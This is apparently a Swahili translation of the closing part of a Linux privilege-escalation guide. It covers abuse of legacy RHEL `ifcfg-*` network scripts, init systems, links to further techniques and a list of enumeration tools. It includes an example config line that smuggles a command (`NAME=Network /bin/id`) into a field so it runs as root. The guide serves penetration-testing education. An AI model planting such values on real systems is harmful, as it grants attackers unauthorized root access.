Faili ya `ifcfg-*` ni kidokezo cha uchunguzi ikiwa mtumiaji mwenye upendeleo wa chini anaweza kuiunda au kuibadilisha **na** njia ya uanzishaji wa mtandao yenye upendeleo itasoma faili hiyo mahususi. Thibitisha ruhusa zinazotumika za faili na saraka, kiolesura kilichochaguliwa, utekelezaji wa `ifup`/`ifdown` uliosakinishwa na anayeziendesha. Faili inayoweza kuandikwa pekee haisababishi utekelezaji. [Mwongozo wa mitandao wa RHEL 7 wa Red Hat](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) unatofautisha network scripts za zamani na NetworkManager: NetworkManager yenyewe haiwashi za zamani. [Nyaraka za RHEL 8](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) zinasema kuwa `ifup`/`ifdown` zake za kawaida hutumia NetworkManager, huku kifurushi cha hiari cha zamani kikitoa shell scripts.

Kwenye mfumo unaotumia kweli scripts za zamani zenye upendeleo, thamani ya `ifcfg-*` kama `NAME=` ambayo haijawekwa ndani ya nukuu na inachukuliwa kama shell script inaweza kuvuka mpaka wa utekelezaji wa msimbo. Thibitisha parser, thamani na njia halisi ya uanzishaji; usidhani kuwa faili itachukuliwa kama shell script kwa kutegemea jina lake au uwepo wa NetworkManager. Wrapper inayoruhusiwa na sudo, inayoweka ingizo la mtumiaji kwenye faili ya `ifcfg-*` kisha kuita `ifup` ya zamani, ni njia tofauti ya kuvuka mpaka huu hata kama mtumiaji hawezi kuhariri faili moja kwa moja.

Kwa mfano: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Kumbuka nafasi tupu kati ya Network na /bin/id_)

### **init, init.d, systemd, na rc.d**

Saraka `/etc/init.d` ina **scripts** za System V init (SysVinit), **mfumo wa kawaida wa zamani wa kusimamia huduma za Linux**. Ina scripts za `start`, `stop`, `restart`, na wakati mwingine `reload` huduma. Hizi zinaweza kutekelezwa moja kwa moja au kupitia viungo vya ishara vilivyo kwenye `/etc/rc?.d/`. Njia mbadala katika mifumo ya Redhat ni `/etc/rc.d/init.d`.

Kwa upande mwingine, `/etc/init` inahusishwa na **Upstart**, mfumo mpya zaidi wa **kusimamia huduma** ulioletwa na Ubuntu, unaotumia faili za usanidi kwa kazi za usimamizi wa huduma. Licha ya kuhamia Upstart, scripts za SysVinit bado hutumika pamoja na usanidi wa Upstart kutokana na safu ya uoanifu iliyopo kwenye Upstart.

**systemd** ni mfumo wa kisasa wa uanzishaji na usimamizi wa huduma, wenye vipengele vya kina kama vile kuanzisha daemon inapohitajika, kusimamia automount, na kuhifadhi snapshots za hali ya mfumo. Hupanga faili katika `/usr/lib/systemd/` kwa vifurushi vya usambazaji na `/etc/systemd/system/` kwa marekebisho ya msimamizi, na kurahisisha mchakato wa usimamizi wa mfumo.<sup>[[21]](#references)</sup>

## Mbinu Nyingine

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Kutoka kwenye Shell zilizozuiliwa


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../../network-services-pentesting/cisco-sd-wan-manager-local-privilege-escalation.md
{{#endref}}

## Android rooting frameworks: matumizi mabaya ya manager-channel

Android rooting frameworks mara nyingi hu-hook syscall ili kufichua utendakazi wa kernel wenye upendeleo kwa manager wa userspace. Uthibitishaji dhaifu wa manager (kwa mfano, ukaguzi wa signature unaotegemea mpangilio wa FD au mifumo dhaifu ya nenosiri) unaweza kuwezesha app ya ndani kujifanya manager na kupata root kwenye vifaa ambavyo tayari vime-rootiwa. Pata maelezo zaidi na jinsi ya kutumia udhaifu huu hapa:


{{#ref}}
../../../mobile-pentesting/android-app-pentesting/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Ugunduzi wa huduma ya VMware Tools LPE (CWE-426) kupitia exec inayotegemea regex (CVE-2025-41244)

Ugunduzi wa huduma unaotumia regex katika VMware Tools/Aria Operations unaweza kutoa njia ya binary kutoka kwenye command line za michakato na kuitekeleza kwa -v katika muktadha wenye upendeleo. Miundo ya ruhusa pana (kwa mfano, kutumia \S) inaweza kulinganisha listeners waliowekwa na mshambulizi katika maeneo yanayoweza kuandikika (kwa mfano, /tmp/httpd), na kusababisha utekelezaji kama root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Pata maelezo zaidi na uone muundo wa jumla unaoweza kutumika kwa stacks nyingine za ugunduzi/ufuatiliaji hapa:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Ulinzi wa Usalama wa Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Msaada Zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Zana za Linux/Unix Privesc

### **Zana bora ya kutafuta vektori za Linux local privilege escalation:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Orodhesha kernel vulns kwenye Linux na MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (ufikiaji wa kimwili):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Mkusanyiko wa scripts nyingine zaidi**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)



## References

- [1] [0xdf – HTB Planning (kupanda kwa upendeleo kupitia Crontab UI, kutumia tena zip -P creds)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: payload ya .text_sig iliyoghushiwa kwa monitor inayoendeshwa na cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: kupita Neighborhood Watch (kuteka PATH kupitia sudo env_keep)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Kupanda kwa Upendeleo wa Msingi kwenye Linux](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Mwongozo wa Kupanda kwa Upendeleo kwenye Linux](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Shambulia na Linda: Mbinu za Kupanda kwa Upendeleo kwenye Linux za 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Hakuna anayetarajia command execution!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Kupanda kwa Upendeleo kwenye Linux)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Mwongozo wa Hatua kwa Hatua wa Mazoezi ya Maabara - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Vidokezo na Mbinu za Kupanda kwa Upendeleo kwenye Linux](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Zana ya Kuhesabu Mifumo na Kupanda kwa Upendeleo kwenye Linux](https://github.com/rtcrowley/linux-private-i)
- [14] [Socket ni nini?](https://www.linux.com/news/what-socket/)
- [15] [Maelezo ya Peppo (Proving Grounds)](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Fahamu D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Kupanda kwa Upendeleo kwenye Linux kupitia Executables za SUID](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Sehemu ya 2 – Kupanda kwa Upendeleo kwenye Linux](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Jinsi ya kusimamia ACLs kwenye Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Kupata root kwenye Redhat/CentOS kupitia network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [systemd ni nini?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (bash arithmetic injection kupitia logs, mnyororo mzima)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [Mwongozo wa GNU Bash – BASH_ENV (faili ya uanzishaji isiyo ya interactive)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + kupanda kwa upendeleo kupitia symlink ya TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (nakala ya pg_basebackup kupitia cron → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Unaliita chochote, VMware hukipandisha (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Kupanda kwa Upendeleo wa Sudo kupitia Chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – Udhaifu wa sudo wa CVE-2025-32462 na CVE-2025-32463 wa kupanda kwa upendeleo](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – Saraka za Hifadhi ya PYC](https://peps.python.org/pep-3147/)
- [32] [Nyaraka za Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [suala la polkit/polkit #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet ya @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Kurekodi Nenosiri kwenye Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Maelezo ya Hali ya Mashindano ya logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Nyaraka za Python 3.10 – `site` na faili za usanidi wa njia](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
